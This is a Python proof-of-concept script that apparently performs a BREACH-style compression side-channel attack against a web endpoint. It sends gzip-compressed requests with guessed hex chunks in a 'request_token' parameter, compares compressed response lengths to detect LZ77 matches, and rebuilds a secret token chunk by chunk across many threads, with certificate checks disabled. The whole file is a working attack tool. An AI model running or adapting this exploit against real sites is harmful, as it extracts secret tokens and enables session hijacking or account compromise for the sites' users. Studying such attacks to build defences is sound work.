import requests
import urllib3
import threading
from itertools import product
from concurrent.futures import ThreadPoolExecutor, as_completed
import os  # For dynamic CPU count

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target
url = 'https://malbot.net/poc/'
param_name = 'request_token'
possible_chars = '0123456789abcdef'

# Config options (test different combinations)
padding = '{}'
padding_amounts = [5]
num_chars_at_once = 3  # chunk size
response_length_diff = num_chars_at_once  # minimum compression to qualify as correct

# Calculate dynamic worker limit
max_workers = (5 * os.cpu_count()) if os.cpu_count() else 5

def get_response_length(url, param_name, guess):
    full_url = f"{url}?{param_name}=%27{guess}"
    headers = {'Accept-Encoding': 'gzip, deflate'}

    try:
        response = requests.get(full_url, headers=headers, verify=False, stream=True)
        response.raise_for_status()
        response.raw.decode_content = False
        compressed_content = response.raw.read()
        return len(compressed_content)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return -1

def guess_token(url, param_name, possible_chars, padding, padding_amount, num_chars_at_once=1):
    """
    Launch all executors at the same time for each iteration. As soon as one chunk is found correct,
    we stop all other futures and proceed to the next iteration. 
    """
    guessed_token = ''
    possible_seqs = [''.join(s) for s in product(possible_chars, repeat=num_chars_at_once)]

    while True:
        found_char = None    # We'll store the correct chunk here
        found_event = threading.Event()

        def worker(chunk):
            """
            Worker function for each chunk. It fetches two URLs,
            compares response lengths, and returns the chunk if correct,
            otherwise None. 
            """
            if found_event.is_set():
                return None  # Another thread already found the correct chunk, bail early
            
            print(f"Trying {chunk}")

            guess1 = guessed_token + chunk + padding * padding_amount + '@'  # test Hoffman+LZ77
            # guess1 = guessed_token + chunk + padding * (padding_amount + len(chunk) - 1) + '@'  # test Hoffman+LZ77
            guess2 = guessed_token + padding * padding_amount + chunk + '@'  # test only Hoffman
            # guess2 = guessed_token + padding * padding_amount + padding.join(e for e in chunk) + '@'  # test only Hoffman

            resp1 = get_response_length(url, param_name, guess1)
            resp2 = get_response_length(url, param_name, guess2)

            if resp1 == -1 or resp2 == -1:
                return None  # Request failed, skip

            # Compare lengths to see if chunk triggers the LZ77 side-channel
            if resp2 - resp1 >= response_length_diff:
                # Found correct chunk
                found_event.set()
                print(chunk, resp2, resp1)
                return chunk
            return None

        print(f"=== Attempting next character with prefix '{guessed_token}' ===")

        # If we never break, that means we didn't find any chunk.
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(worker, c) for c in possible_seqs]

            # Process results as they complete:
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    # This means we found the correct chunk for this iteration
                    found_char = result
                    # Cancel the remaining futures
                    for f in futures:
                        if not f.done():
                            f.cancel()
                    break  # Break out of the as_completed loop

        if found_char:
            guessed_token += found_char
            print(f"Found chunk: '{found_char}'. Updated token: '{guessed_token}'")
            # Continue to the next iteration to guess the next chunk
        else:
            print("Could not find the next chunk. Stopping.")
            break

    print(f"Final guessed token: '{guessed_token}'")
    return guessed_token


def main():
    # Attempt with different padding lengths
    guessed_tokens = {}
    for padding_amount in padding_amounts:
        print(f"\n[+] Trying padding_amount={padding_amount} ...")
        guessed_tokens[padding_amount] = guess_token(url, param_name, possible_chars, padding, padding_amount, num_chars_at_once)

    # Sort by number of guessed characters
    sorted_tokens = sorted(guessed_tokens.items(), key=lambda x: len(x[1]), reverse=True)
    for padding_amount, token in sorted_tokens:
        print(f"Padding Amount: {padding_amount}, Token Length: {len(token)}, Token: '{token}'")


if __name__ == '__main__':
    main()
